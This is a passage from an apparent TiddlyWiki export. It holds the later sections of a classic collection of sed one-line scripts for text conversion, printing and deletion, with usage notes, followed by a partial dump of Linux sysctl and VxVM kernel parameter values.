 # number each line of a file (number on left, right-aligned)
 sed = filename | sed 'N; s/^/     /; s/ *\(.\{6,\}\)\n/\1  /'

 # number each line of file, but only print numbers if line is not blank
 sed '/./=' filename | sed '/./N; s/\n/ /'

 # count lines (emulates &quot;wc -l&quot;)
 sed -n '$='

TEXT CONVERSION AND SUBSTITUTION:

 # IN UNIX ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format
 sed 's/.$//'               # assumes that all lines end with CR/LF
 sed 's/^M$//'              # in bash/tcsh, press Ctrl-V then Ctrl-M
 sed 's/\x0D$//'            # gsed 3.02.80, but top script is easier

 # IN UNIX ENVIRONMENT: convert Unix newlines (LF) to DOS format
 sed &quot;s/$/`echo -e \\\r`/&quot;            # command line under ksh
 sed 's/$'&quot;/`echo \\\r`/&quot;             # command line under bash
 sed &quot;s/$/`echo \\\r`/&quot;               # command line under zsh
 sed 's/$/\r/'                        # gsed 3.02.80

 # IN DOS ENVIRONMENT: convert Unix newlines (LF) to DOS format
 sed &quot;s/$//&quot;                          # method 1
 sed -n p                             # method 2

 # IN DOS ENVIRONMENT: convert DOS newlines (CR/LF) to Unix format
 # Can only be done with UnxUtils sed, version 4.0.7 or higher.
 # Cannot be done with other DOS versions of sed. Use &quot;tr&quot; instead.
 sed &quot;s/\r//&quot; infile &gt;outfile         # UnxUtils sed v4.0.7 or higher
 tr -d \r &lt;infile &gt;outfile            # GNU tr version 1.22 or higher

 # delete leading whitespace (spaces, tabs) from front of each line
 # aligns all text flush left
 sed 's/^[ \t]*//'                    # see note on '\t' at end of file

 # delete trailing whitespace (spaces, tabs) from end of each line
 sed 's/[ \t]*$//'                    # see note on '\t' at end of file

 # delete BOTH leading and trailing whitespace from each line
 sed 's/^[ \t]*//;s/[ \t]*$//'

 # insert 5 blank spaces at beginning of each line (make page offset)
 sed 's/^/     /'

 # align all text flush right on a 79-column width
 sed -e :a -e 's/^.\{1,78\}$/ &amp;/;ta'  # set at 78 plus 1 space

 # center all text in the middle of 79-column width. In method 1,
 # spaces at the beginning of the line are significant, and trailing
 # spaces are appended at the end of the line. In method 2, spaces at
 # the beginning of the line are discarded in centering the line, and
 # no trailing spaces appear at the end of lines.
 sed  -e :a -e 's/^.\{1,77\}$/ &amp; /;ta'                     # method 1
 sed  -e :a -e 's/^.\{1,77\}$/ &amp;/;ta' -e 's/\( *\)\1/\1/'  # method 2

 # substitute (find and replace) &quot;foo&quot; with &quot;bar&quot; on each line
 sed 's/foo/bar/'             # replaces only 1st instance in a line
 sed 's/foo/bar/4'            # replaces only 4th instance in a line
 sed 's/foo/bar/g'            # replaces ALL instances in a line
 sed 's/\(.*\)foo\(.*foo\)/\1bar\2/' # replace the next-to-last case
 sed 's/\(.*\)foo/\1bar/'            # replace only the last case

 # substitute &quot;foo&quot; with &quot;bar&quot; ONLY for lines which contain &quot;baz&quot;
 sed '/baz/s/foo/bar/g'

 # substitute &quot;foo&quot; with &quot;bar&quot; EXCEPT for lines which contain &quot;baz&quot;
 sed '/baz/!s/foo/bar/g'

 # change &quot;scarlet&quot; or &quot;ruby&quot; or &quot;puce&quot; to &quot;red&quot;
 sed 's/scarlet/red/g;s/ruby/red/g;s/puce/red/g'   # most seds
 gsed 's/scarlet\|ruby\|puce/red/g'                # GNU sed only

 # reverse order of lines (emulates &quot;tac&quot;)
 # bug/feature in HHsed v1.5 causes blank lines to be deleted
 sed '1!G;h;$!d'               # method 1
 sed -n '1!G;h;$p'             # method 2

 # reverse each character on the line (emulates &quot;rev&quot;)
 sed '/\n/!G;s/\(.\)\(.*\n\)/&amp;\2\1/;//D;s/.//'

 # join pairs of lines side-by-side (like &quot;paste&quot;)
 sed '$!N;s/\n/ /'

 # if a line ends with a backslash, append the next line to it
 sed -e :a -e '/\\$/N; s/\\\n//; ta'

 # if a line begins with an equal sign, append it to the previous line
 # and replace the &quot;=&quot; with a single space
 sed -e :a -e '$!N;s/\n=/ /;ta' -e 'P;D'

 # add commas to numeric strings, changing &quot;1234567&quot; to &quot;1,234,567&quot;
 gsed ':a;s/\B[0-9]\{3\}\&gt;/,&amp;/;ta'                     # GNU sed
 sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta'  # other seds

 # add commas to numbers with decimal points and minus signs (GNU sed)
 gsed ':a;s/\(^\|[^0-9.]\)\([0-9]\+\)\([0-9]\{3\}\)/\1\2,\3/g;ta'

 # add a blank line every 5 lines (after lines 5, 10, 15, 20, etc.)
 gsed '0~5G'                  # GNU sed only
 sed 'n;n;n;n;G;'             # other seds

SELECTIVE PRINTING OF CERTAIN LINES:

 # print first 10 lines of file (emulates behavior of &quot;head&quot;)
 sed 10q

 # print first line of file (emulates &quot;head -1&quot;)
 sed q

 # print the last 10 lines of a file (emulates &quot;tail&quot;)
 sed -e :a -e '$q;N;11,$D;ba'

 # print the last 2 lines of a file (emulates &quot;tail -2&quot;)
 sed '$!N;$!D'

 # print the last line of a file (emulates &quot;tail -1&quot;)
 sed '$!d'                    # method 1
 sed -n '$p'                  # method 2

 # print only lines which match regular expression (emulates &quot;grep&quot;)
 sed -n '/regexp/p'           # method 1
 sed '/regexp/!d'             # method 2

 # print only lines which do NOT match regexp (emulates &quot;grep -v&quot;)
 sed -n '/regexp/!p'          # method 1, corresponds to above
 sed '/regexp/d'              # method 2, simpler syntax

 # print the line immediately before a regexp, but not the line
 # containing the regexp
 sed -n '/regexp/{g;1!p;};h'

 # print the line immediately after a regexp, but not the line
 # containing the regexp
 sed -n '/regexp/{n;p;}'

 # print 1 line of context before and after regexp, with line number
 # indicating where the regexp occurred (similar to &quot;grep -A1 -B1&quot;)
 sed -n -e '/regexp/{=;x;1!p;g;$!N;p;D;}' -e h

 # grep for AAA and BBB and CCC (in any order)
 sed '/AAA/!d; /BBB/!d; /CCC/!d'

 # grep for AAA and BBB and CCC (in that order)
 sed '/AAA.*BBB.*CCC/!d'

 # grep for AAA or BBB or CCC (emulates &quot;egrep&quot;)
 sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d    # most seds
 gsed '/AAA\|BBB\|CCC/!d'                        # GNU sed only

 # print paragraph if it contains AAA (blank lines separate paragraphs)
 # HHsed v1.5 must insert a 'G;' after 'x;' in the next 3 scripts below
 sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;'

 # print paragraph if it contains AAA and BBB and CCC (in any order)
 sed -e '/./{H;$!d;}' -e 'x;/AAA/!d;/BBB/!d;/CCC/!d'

 # print paragraph if it contains AAA or BBB or CCC
 sed -e '/./{H;$!d;}' -e 'x;/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d
 gsed '/./{H;$!d;};x;/AAA\|BBB\|CCC/b;d'         # GNU sed only

 # print only lines of 65 characters or longer
 sed -n '/^.\{65\}/p'

 # print only lines of less than 65 characters
 sed -n '/^.\{65\}/!p'        # method 1, corresponds to above
 sed '/^.\{65\}/d'            # method 2, simpler syntax

 # print section of file from regular expression to end of file
 sed -n '/regexp/,$p'

 # print section of file based on line numbers (lines 8-12, inclusive)
 sed -n '8,12p'               # method 1
 sed '8,12!d'                 # method 2

 # print line number 52
 sed -n '52p'                 # method 1
 sed '52!d'                   # method 2
 sed '52q;d'                  # method 3, efficient on large files

 # beginning at line 3, print every 7th line
 gsed -n '3~7p'               # GNU sed only
 sed -n '3,${p;n;n;n;n;n;n;}' # other seds

 # print section of file between two regular expressions (inclusive)
 sed -n '/Iowa/,/Montana/p'             # case sensitive

SELECTIVE DELETION OF CERTAIN LINES:

 # print all of file EXCEPT section between 2 regular expressions
 sed '/Iowa/,/Montana/d'

 # delete duplicate, consecutive lines from a file (emulates &quot;uniq&quot;).
 # First line in a set of duplicate lines is kept, rest are deleted.
 sed '$!N; /^\(.*\)\n\1$/!P; D'

 # delete duplicate, nonconsecutive lines from a file. Beware not to
 # overflow the buffer size of the hold space, or else use GNU sed.
 sed -n 'G; s/\n/&amp;&amp;/; /^\([ -~]*\n\).*\n\1/d; s/\n//; h; P'

 # delete all lines except duplicate lines (emulates &quot;uniq -d&quot;).
 sed '$!N; s/^\(.*\)\n\1$/\1/; t; D'

 # delete the first 10 lines of a file
 sed '1,10d'

 # delete the last line of a file
 sed '$d'

 # delete the last 2 lines of a file
 sed 'N;$!P;$!D;$d'

 # delete the last 10 lines of a file
 sed -e :a -e '$d;N;2,10ba' -e 'P;D'   # method 1
 sed -n -e :a -e '1,10!{P;N;D;};N;ba'  # method 2

 # delete every 8th line
 gsed '0~8d'                           # GNU sed only
 sed 'n;n;n;n;n;n;n;d;'                # other seds

 # delete ALL blank lines from a file (same as &quot;grep '.' &quot;)
 sed '/^$/d'                           # method 1
 sed '/./!d'                           # method 2

 # delete all CONSECUTIVE blank lines from file except the first; also
 # deletes all blank lines from top and end of file (emulates &quot;cat -s&quot;)
 sed '/./,/^$/!d'          # method 1, allows 0 blanks at top, 1 at EOF
 sed '/^$/N;/\n$/D'        # method 2, allows 1 blank at top, 0 at EOF

 # delete all CONSECUTIVE blank lines from file except the first 2:
 sed '/^$/N;/\n$/N;//D'

 # delete all leading blank lines at top of file
 sed '/./,$!d'

 # delete all trailing blank lines at end of file
 sed -e :a -e '/^\n*$/{$d;N;ba' -e '}'  # works on all seds
 sed -e :a -e '/^\n*$/N;/\n$/ba'        # ditto, except for gsed 3.02*

 # delete the last line of each paragraph
 sed -n '/^$/{p;h;};/./{x;/./p;}'

SPECIAL APPLICATIONS:

 # remove nroff overstrikes (char, backspace) from man pages. The 'echo'
 # command may need an -e switch if you use Unix System V or bash shell.
 sed &quot;s/.`echo \\\b`//g&quot;    # double quotes required for Unix environment
 sed 's/.^H//g'             # in bash/tcsh, press Ctrl-V and then Ctrl-H
 sed 's/.\x08//g'           # hex expression for sed v1.5

 # get Usenet/e-mail message header
 sed '/^$/q'                # deletes everything after first blank line

 # get Usenet/e-mail message body
 sed '1,/^$/d'              # deletes everything up to first blank line

 # get Subject header, but remove initial &quot;Subject: &quot; portion
 sed '/^Subject: */!d; s///;q'

 # get return address header
 sed '/^Reply-To:/q; /^From:/h; /./d;g;q'

 # parse out the address proper. Pulls out the e-mail address by itself
 # from the 1-line return address header (see preceding script)
 sed 's/ *(.*)//; s/&gt;.*//; s/.*[:&lt;] *//'

 # add a leading angle bracket and space to each line (quote a message)
 sed 's/^/&gt; /'

 # delete leading angle bracket &amp; space from each line (unquote a message)
 sed 's/^&gt; //'

 # remove most HTML tags (accommodates multiple-line tags)
 sed -e :a -e 's/&lt;[^&gt;]*&gt;//g;/&lt;/N;//ba'

 # extract multi-part uuencoded binaries, removing extraneous header
 # info, so that only the uuencoded portion remains. Files passed to
 # sed must be passed in the proper order. Version 1 can be entered
 # from the command line; version 2 can be made into an executable
 # Unix shell script. (Modified from a script by Rahul Dhesi.)
 sed '/^end/,/^begin/d' file1 file2 ... fileX | uudecode   # vers. 1
 sed '/^end/,/^begin/d' &quot;$@&quot; | uudecode                    # vers. 2

 # zip up each .TXT file individually, deleting the source file and
 # setting the name of each .ZIP file to the basename of the .TXT file
 # (under DOS: the &quot;dir /b&quot; switch returns bare filenames in all caps).
 echo @echo off &gt;zipup.bat
 dir /b *.txt | sed &quot;s/^\(.*\)\.TXT/pkzip -mo \1 \1.TXT/&quot; &gt;&gt;zipup.bat

TYPICAL USE: Sed takes one or more editing commands and applies all of
them, in sequence, to each line of input. After all the commands have
been applied to the first input line, that line is output and a second
input line is taken for processing, and the cycle repeats. The
preceding examples assume that input comes from the standard input
device (i.e, the console, normally this will be piped input). One or
more filenames can be appended to the command line if the input does
not come from stdin. Output is sent to stdout (the screen). Thus:

 cat filename | sed '10q'        # uses piped input
 sed '10q' filename              # same effect, avoids a useless &quot;cat&quot;
 sed '10q' filename &gt; newfile    # redirects output to disk

For additional syntax instructions, including the way to apply editing
commands from a disk file instead of the command line, consult &quot;sed &amp;
awk, 2nd Edition,&quot; by Dale Dougherty and Arnold Robbins (O'Reilly,
1997; http://www.ora.com), &quot;UNIX Text Processing,&quot; by Dale Dougherty
and Tim O'Reilly (Hayden Books, 1987) or the tutorials by Mike Arst
distributed in U-SEDIT2.ZIP (many sites). To fully exploit the power
of sed, one must understand &quot;regular expressions.&quot; For this, see
&quot;Mastering Regular Expressions&quot; by Jeffrey Friedl (O'Reilly, 1997).
The manual (&quot;man&quot;) pages on Unix systems may be helpful (try &quot;man
sed&quot;, &quot;man regexp&quot;, or the subsection on regular expressions in &quot;man
ed&quot;), but man pages are notoriously difficult. They are not written to
teach sed use or regexps to first-time users, but as a reference text
for those already acquainted with these tools.

QUOTING SYNTAX: The preceding examples use single quotes ('...')
instead of double quotes (&quot;...&quot;) to enclose editing commands, since
sed is typically used on a Unix platform. Single quotes prevent the
Unix shell from intrepreting the dollar sign ($) and backquotes
(`...`), which are expanded by the shell if they are enclosed in
double quotes. Users of the &quot;csh&quot; shell and derivatives will also need
to quote the exclamation mark (!) with the backslash (i.e., \!) to
properly run the examples listed above, even within single quotes.
Versions of sed written for DOS invariably require double quotes
(&quot;...&quot;) instead of single quotes to enclose editing commands.

USE OF '\t' IN SED SCRIPTS: For clarity in documentation, we have used
the expression '\t' to indicate a tab character (0x09) in the scripts.
However, most versions of sed do not recognize the '\t' abbreviation,
so when typing these scripts from the command line, you should press
the TAB key instead. '\t' is supported as a regular expression
metacharacter in awk, perl, and HHsed, sedmod, and GNU sed v3.02.80.

VERSIONS OF SED: Versions of sed do differ, and some slight syntax
variation is to be expected. In particular, most do not support the
use of labels (:name) or branch instructions (b,t) within editing
commands, except at the end of those commands. We have used the syntax
which will be portable to most users of sed, even though the popular
GNU versions of sed allow a more succinct syntax. When the reader sees
a fairly long command such as this:

   sed -e '/AAA/b' -e '/BBB/b' -e '/CCC/b' -e d

it is heartening to know that GNU sed will let you reduce it to:

   sed '/AAA/b;/BBB/b;/CCC/b;d'      # or even
   sed '/AAA\|BBB\|CCC/b;d'

In addition, remember that while many versions of sed accept a command
like &quot;/one/ s/RE1/RE2/&quot;, some do NOT allow &quot;/one/! s/RE1/RE2/&quot;, which
contains space before the 's'. Omit the space when typing the command.

OPTIMIZING FOR SPEED: If execution speed needs to be increased (due to
large input files or slow processors or hard disks), substitution will
be executed more quickly if the &quot;find&quot; expression is specified before
giving the &quot;s/.../.../&quot; instruction. Thus:

   sed 's/foo/bar/g' filename         # standard replace command
   sed '/foo/ s/foo/bar/g' filename   # executes more quickly
   sed '/foo/ s//bar/g' filename      # shorthand sed syntax

On line selection or deletion in which you only need to output lines
from the first part of the file, a &quot;quit&quot; command (q) in the script
will drastically reduce processing time for large files. Thus:

   sed -n '45,50p' filename           # print line nos. 45-50 of a file
   sed -n '51q;45,50p' filename       # same, but executes much faster

If you have any additional scripts to contribute or if you find errors
in this document, please send e-mail to the compiler. Indicate the
version of sed you used, the operating system it was compiled for, and
the nature of the problem. Various scripts in this file were written
or contributed by:

 Al Aab &lt;af137@freenet.toronto.on.ca&gt;   # &quot;seders&quot; list moderator
 Edgar Allen &lt;era@sky.net&gt;              # various
 Yiorgos Adamopoulos &lt;adamo@softlab.ece.ntua.gr&gt;
 Dale Dougherty &lt;dale@songline.com&gt;     # author of &quot;sed &amp; awk&quot;
 Carlos Duarte &lt;cdua@algos.inesc.pt&gt;    # author of &quot;do it with sed&quot;
 Eric Pement &lt;pemente@northpark.edu&gt;    # author of this document
 Ken Pizzini &lt;ken@halcyon.com&gt;          # author of GNU sed v3.02
 S.G. Ravenhall &lt;stew.ravenhall@totalise.co.uk&gt; # great de-html script
 Greg Ubben &lt;gsu@romulus.ncsc.mil&gt;      # many contributions &amp; much help
}}}</pre>
</div>
<div title="sysctl variables" modifier="BhargavaKancherla" modified="200807080412" created="200807080411" changecount="2">
<pre>vxvm.vxinfo.volkio_commitwaitq = volkioq_commitwait_start count: 0
vxvm.vxinfo.volkio_commitwaitq = volkioq_commitwait_start:
vxvm.vxinfo.volkioqueue = volkioq_start count: 0
vxvm.vxinfo.volkioqueue = volkioq_start:
vxvm.vxinfo.volsio_otherq = volsioq_done count: 0
vxvm.vxinfo.volsio_otherq = volsioq_done:
vxvm.vxinfo.volsio_otherq = volsioq_restart count: 0
vxvm.vxinfo.volsio_otherq = volsioq_restart:
vxvm.vxinfo.volsio_otherq = volsioq_redone count: 0
vxvm.vxinfo.volsio_otherq = volsioq_redone:
vxvm.vxinfo.volsio_idleq = volsioq_idle_start count: 0
vxvm.vxinfo.volsio_idleq = volsioq_idle_start:
vxvm.vxinfo.volsioqueue = volsioq_start count: 0
vxvm.vxinfo.volsioqueue = volsioq_start:
vxvm.vxinfo.volktrans = vol_config_loaded: 0
vxvm.vxinfo.volktrans = vol_commit_in_progress: 0
vxvm.vxinfo.volktrans = vol_ktrans_locked: 0
vxvm.vxinfo.volktrans = vol_ktrans_pending_abort: 0
vxvm.vxinfo.volktrans = vol_ktrans_abort_is_possible: 0
vxvm.vxinfo.volktrans = transaction state: vxvm.vxinfo.voliod_info = voliod_running: 0
vxvm.vxinfo.voliod_info = voliod_need: 0
vxvm.vxinfo.voliod_info = voliod_count: 16
vxvm.vxinfo.voliod_info = voliod_want_count: 16
vxvm.vxinfo.voliomem = memory reservation pool usage
vxvm.vxinfo.voliomem = id: max mem used: total allocated mem: mem in use: min mem: max mem
vxvm.vxinfo.voliomem =  0        0            100000             0        100000     8000000
vxvm.vxinfo.volkiocount_locked = volkiocount: 0
vxvm.vxinfo.volkiocount = volkiocount: 0
vxvm.vxio.vol_rp_decrement = 8
vxvm.vxio.vol_rp_increment = 8
vxvm.vxio.vol_use_rq = 1
vxvm.vxio.hacomm_logbuf_slots = 1000
vxvm.vxio.hacomm_transbuf_slots = 256
vxvm.vxio.hacomm_tracebuf_slots = 1024
vxvm.vxio.svm_session_trace_count = 2000
vxvm.vxio.svm_debugging_enable = 0
vxvm.vxio.vxvm_req_stack_endio = 3072
vxvm.vxio.vxvm_req_stack = 4096
vxvm.vxio.hacomm_min_winsz_enable_app = 2048
vxvm.vxio.hacomm_min_winsz_enable_peer = 2048
vxvm.vxio.hacomm_min_split_segsz = 1024
vxvm.vxio.hacomm_max_segsz = 1048576
vxvm.vxio.hacomm_min_split_fragsz = 2048
vxvm.vxio.hacomm_max_fragsz = 1048576
vxvm.vxio.hacomm_rcv_bufsz = 1048576
vxvm.vxio.hacomm_snd_bufsz = 1048576
vxvm.vxio.hacomm_msg_batching_ok = 1
vxvm.vxio.hacomm_direct_send_ok = 1
vxvm.vxio.hacomm_restore_interval = 60
vxvm.vxio.hacomm_hb_interval = 3
vxvm.vxio.hacomm_ack_interval = 200
vxvm.vxio.svm_txpt_type = 2
vxvm.vxio.voldrl_max_seq_dirty = 3
vxvm.vxio.vol_max_volumes = 65534
vxvm.vxio.vol_rvio_maxpool_sz = 134217728
vxvm.vxio.vol_vvr_use_nat = 0
vxvm.vxio.vol_max_wrspool_sz = 16777216
vxvm.vxio.vol_nm_hb_timeout = 10
vxvm.vxio.vol_dcm_replay_size = 262144
vxvm.vxio.volraid_minpool_size = 4194304
vxvm.vxio.volcvm_smartsync = 1
vxvm.vxio.vol_min_lowmem_sz = 4194304
vxvm.vxio.vol_max_nmpool_sz = 16777216
vxvm.vxio.vol_max_rdback_sz = 67108864
vxvm.vxio.volpagemod_max_memsz = 1536	0
vxvm.vxio.vol_fmr_logsz = 4
vxvm.vxio.voliomem_maxpool_sz = 134217728
vxvm.vxio.voliomem_chunk_size = 32768
vxvm.vxio.vol_max_nlogs = 20
vxvm.vxio.vol_max_nconfigs = 20
vxvm.vxio.vxtask_max_monitors = 32
vxvm.vxio.vol_checkpt_default = 20480
vxvm.vxio.voliot_max_open = 32
vxvm.vxio.voliot_errbuf_dflt = 16384
vxvm.vxio.voliot_iobuf_default = 8192
vxvm.vxio.voliot_iobuf_max = 65536
vxvm.vxio.voliot_iobuf_limit = 131072
vxvm.vxio.vol_maxstablebufsize = 256
vxvm.vxio.vol_mvr_maxround = 512
vxvm.vxio.vol_maxparallelio = 256
vxvm.vxio.voldrl_max_drtregs = 2048
vxvm.vxio.voldrl_min_regionsz = 1024
vxvm.vxio.vol_default_iodelay = 50
vxvm.vxio.maxiosize = 2048
vxvm.vxio.vol_maxioctl = 32768
vxvm.vxio.vol_maxkiocount = 6000
vxdmp.dmp_retry_count = 5
vxdmp.dmp_restore_cycles = 10
vxdmp.dmp_restore_policy = 1
vxdmp.dmp_restore_interval = 300
vxdmp.dmp_pathswitch_blks_shift = 11
sunrpc.max_shared = 1
sunrpc.tcp_slot_table_entries = 16
sunrpc.udp_slot_table_entries = 16
sunrpc.max_resvport = 1023
sunrpc.min_resvport = 650
sunrpc.nlm_debug = 0
sunrpc.nfsd_debug = 0
sunrpc.nfs_debug = 0
sunrpc.rpc_debug = 0
abi.fake_utsname = 0
abi.trace = 0
abi.vsyscall32 = 1
numa-tmpfs-rr = 1
heap-stack-gap = 1
dev.scsi.logging_level = 0
dev.raid.speed_limit_max = 200000
dev.raid.speed_limit_min = 1000
dev.cdrom.check_media = 0
dev.cdrom.lock = 1
dev.cdrom.debug = 0
dev.cdrom.autoeject = 0
dev.cdrom.autoclose = 1
dev.cdrom.info = ~CD-ROM information, Id: cdrom.c 3.20 2003/12/17
dev.cdrom.info = 
dev.cdrom.info = drive name:		sr0	hda
dev.cdrom.info = drive speed:		1	24
dev.cdrom.info = drive # of slots:	1	1
dev.cdrom.info = Can close tray:		1	1
dev.cdrom.info = Can open tray:		1	1
dev.cdrom.info = Can lock tray:		1	1
dev.cdrom.info = Can change speed:	0	1
dev.cdrom.info = Can select disk:	0	0
dev.cdrom.info = Can read multisession:	1	1
dev.cdrom.info = Can read MCN:		1	1
dev.cdrom.info = Reports media changed:	1	1
dev.cdrom.info = Can play audio:		1	1
dev.cdrom.info = Can write ~CD-R:		0	0
dev.cdrom.info = Can write ~CD-RW:	0	0
dev.cdrom.info = Can read DVD:		0	0
dev.cdrom.info = Can write ~DVD-R:	0	0
dev.cdrom.info = Can write ~DVD-RAM:	0	0
dev.cdrom.info = Can read MRW:		1	0
dev.cdrom.info = Can write MRW:		1	0
dev.cdrom.info = Can write RAM:		1	0
dev.cdrom.info = 
dev.cdrom.info = 
dev.rtc.max-user-freq = 64
debug.exception-trace = 1
net.ipv6.conf.pubeth1.max_addresses = 16
net.ipv6.conf.pubeth1.max_desync_factor = 600
net.ipv6.conf.pubeth1.regen_max_retry = 5
net.ipv6.conf.pubeth1.temp_prefered_lft = 86400
net.ipv6.conf.pubeth1.temp_valid_lft = 604800
net.ipv6.conf.pubeth1.use_tempaddr = 0
net.ipv6.conf.pubeth1.force_mld_version = 0
net.ipv6.conf.pubeth1.router_solicitation_delay = 1
net.ipv6.conf.pubeth1.router_solicitation_interval = 4
net.ipv6.conf.pubeth1.router_solicitations = 3
net.ipv6.conf.pubeth1.dad_transmits = 1
net.ipv6.conf.pubeth1.autoconf = 1
net.ipv6.conf.pubeth1.accept_redirects = 1
net.ipv6.conf.pubeth1.accept_ra = 1
net.ipv6.conf.pubeth1.mtu = 1500
net.ipv6.conf.pubeth1.hop_limit = 64
net.ipv6.conf.pubeth1.forwarding = 0
net.ipv6.conf.pubeth0.max_addresses = 16
net.ipv6.conf.pubeth0.max_desync_factor = 600
net.ipv6.conf.pubeth0.regen_max_retry = 5
net.ipv6.conf.pubeth0.temp_prefered_lft = 86400
net.ipv6.conf.pubeth0.temp_valid_lft = 604800
net.ipv6.conf.pubeth0.use_tempaddr = 0
net.ipv6.conf.pubeth0.force_mld_version = 0
net.ipv6.conf.pubeth0.router_solicitation_delay = 1
net.ipv6.conf.pubeth0.router_solicitation_interval = 4
net.ipv6.conf.pubeth0.router_solicitations = 3
net.ipv6.conf.pubeth0.dad_transmits = 1
net.ipv6.conf.pubeth0.autoconf = 1
net.ipv6.conf.pubeth0.accept_redirects = 1
net.ipv6.conf.pubeth0.accept_ra = 1
net.ipv6.conf.pubeth0.mtu = 1500
net.ipv6.conf.pubeth0.hop_limit = 64
net.ipv6.conf.pubeth0.forwarding = 0
net.ipv6.conf.priveth1.max_addresses = 16
net.ipv6.conf.priveth1.max_desync_factor = 600
net.ipv6.conf.priveth1.regen_max_retry = 5
net.ipv6.conf.priveth1.temp_prefered_lft = 86400
net.ipv6.conf.priveth1.temp_valid_lft = 604800
net.ipv6.conf.priveth1.use_tempaddr = 0
net.ipv6.conf.priveth1.force_mld_version = 0
net.ipv6.conf.priveth1.router_solicitation_delay = 1
net.ipv6.conf.priveth1.router_solicitation_interval = 4
net.ipv6.conf.priveth1.router_solicitations = 3
net.ipv6.conf.priveth1.dad_transmits = 1
net.ipv6.conf.priveth1.autoconf = 1
net.ipv6.conf.priveth1.accept_redirects = 1
net.ipv6.conf.priveth1.accept_ra = 1
net.ipv6.conf.priveth1.mtu = 1500
net.ipv6.conf.priveth1.hop_limit = 64
net.ipv6.conf.priveth1.forwarding = 0
net.ipv6.conf.sit0.max_addresses = 16
net.ipv6.conf.sit0.max_desync_factor = 600
net.ipv6.conf.sit0.regen_max_retry = 5
net.ipv6.conf.sit0.temp_prefered_lft = 86400
net.ipv6.conf.sit0.temp_valid_lft = 604800
net.ipv6.conf.sit0.use_tempaddr = -1
net.ipv6.conf.sit0.force_mld_version = 0
net.ipv6.conf.sit0.router_solicitation_delay = 1
net.ipv6.conf.sit0.router_solicitation_interval = 4
net.ipv6.conf.sit0.router_solicitations = 3
net.ipv6.conf.sit0.dad_transmits = 1
net.ipv6.conf.sit0.autoconf = 1
net.ipv6.conf.sit0.accept_redirects = 1
net.ipv6.conf.sit0.accept_ra = 1
net.ipv6.conf.sit0.mtu = 1480
net.ipv6.conf.sit0.hop_limit = 64
net.ipv6.conf.sit0.forwarding = 0
net.ipv6.conf.default.max_addresses = 16
net.ipv6.conf.default.max_desync_factor = 600
net.ipv6.conf.default.regen_max_retry = 5
net.ipv6.conf.default.temp_prefered_lft = 86400
net.ipv6.conf.default.temp_valid_lft = 604800
net.ipv6.conf.default.use_tempaddr = 0
net.ipv6.conf.default.force_mld_version = 0
net.ipv6.conf.default.router_solicitation_delay = 1
net.ipv6.conf.default.router_solicitation_interval = 4
net.ipv6.conf.default.router_solicitations = 3
net.ipv6.conf.default.dad_transmits = 1
net.ipv6.conf.default.autoconf = 1
net.ipv6.conf.default.accept_redirects = 1
net.ipv6.conf.default.accept_ra = 1
net.ipv6.conf.default.mtu = 1280
net.ipv6.conf.default.hop_limit = 64
net.ipv6.conf.default.forwarding = 0
net.ipv6.conf.all.max_addresses = 16
net.ipv6.conf.all.max_desync_factor = 600
net.ipv6.conf.all.regen_max_retry = 5
net.ipv6.conf.all.temp_prefered_lft = 86400
net.ipv6.conf.all.temp_valid_lft = 604800
net.ipv6.conf.all.use_tempaddr = 0
net.ipv6.conf.all.force_mld_version = 1
net.ipv6.conf.all.router_solicitation_delay = 1
net.ipv6.conf.all.router_solicitation_interval = 4
net.ipv6.conf.all.router_solicitations = 3
net.ipv6.conf.all.dad_transmits = 1
net.ipv6.conf.all.autoconf = 1
net.ipv6.conf.all.accept_redirects = 1
net.ipv6.conf.all.accept_ra = 1
net.ipv6.conf.all.mtu = 1280
net.ipv6.conf.all.hop_limit = 64
net.ipv6.conf.all.forwarding = 0
net.ipv6.conf.priveth0.max_addresses = 16
net.ipv6.conf.priveth0.max_desync_factor = 600
net.ipv6.conf.priveth0.regen_max_retry = 5
net.ipv6.conf.priveth0.temp_prefered_lft = 86400
net.ipv6.conf.priveth0.temp_valid_lft = 604800
net.ipv6.conf.priveth0.use_tempaddr = 0
net.ipv6.conf.priveth0.force_mld_version = 0
net.ipv6.conf.priveth0.router_solicitation_delay = 1
net.ipv6.conf.priveth0.router_solicitation_interval = 4
net.ipv6.conf.priveth0.router_solicitations = 3
net.ipv6.conf.priveth0.dad_transmits = 1
net.ipv6.conf.priveth0.autoconf = 1
net.ipv6.conf.priveth0.accept_redirects = 1
net.ipv6.conf.priveth0.accept_ra = 1
net.ipv6.conf.priveth0.mtu = 1500
net.ipv6.conf.priveth0.hop_limit = 64
net.ipv6.conf.priveth0.forwarding = 0
net.ipv6.conf.lo.max_addresses = 16
net.ipv6.conf.lo.max_desync_factor = 600
net.ipv6.conf.lo.regen_max_retry = 5
net.ipv6.conf.lo.temp_prefered_lft = 86400
net.ipv6.conf.lo.temp_valid_lft = 604800
net.ipv6.conf.lo.use_tempaddr = -1
net.ipv6.conf.lo.force_mld_version = 0
net.ipv6.conf.lo.router_solicitation_delay = 1
net.ipv6.conf.lo.router_solicitation_interval = 4
net.ipv6.conf.lo.router_solicitations = 3
net.ipv6.conf.lo.dad_transmits = 1
net.ipv6.conf.lo.autoconf = 1
net.ipv6.conf.lo.accept_redirects = 1
net.ipv6.conf.lo.accept_ra = 1
net.ipv6.conf.lo.mtu = 16436
net.ipv6.conf.lo.hop_limit = 64
net.ipv6.conf.lo.forwarding = 0
net.ipv6.neigh.pubeth1.locktime = 0
net.ipv6.neigh.pubeth1.proxy_delay = 80
net.ipv6.neigh.pubeth1.anycast_delay = 100
net.ipv6.neigh.pubeth1.proxy_qlen = 64
net.ipv6.neigh.pubeth1.unres_qlen = 3
net.ipv6.neigh.pubeth1.gc_stale_time = 60
net.ipv6.neigh.pubeth1.delay_first_probe_time = 5
net.ipv6.neigh.pubeth1.base_reachable_time = 30
net.ipv6.neigh.pubeth1.retrans_time = 1000
net.ipv6.neigh.pubeth1.app_solicit = 0
net.ipv6.neigh.pubeth1.ucast_solicit = 3
net.ipv6.neigh.pubeth1.mcast_solicit = 3
net.ipv6.neigh.pubeth0.locktime = 0
net.ipv6.neigh.pubeth0.proxy_delay = 80
net.ipv6.neigh.pubeth0.anycast_delay = 100
net.ipv6.neigh.pubeth0.proxy_qlen = 64
net.ipv6.neigh.pubeth0.unres_qlen = 3
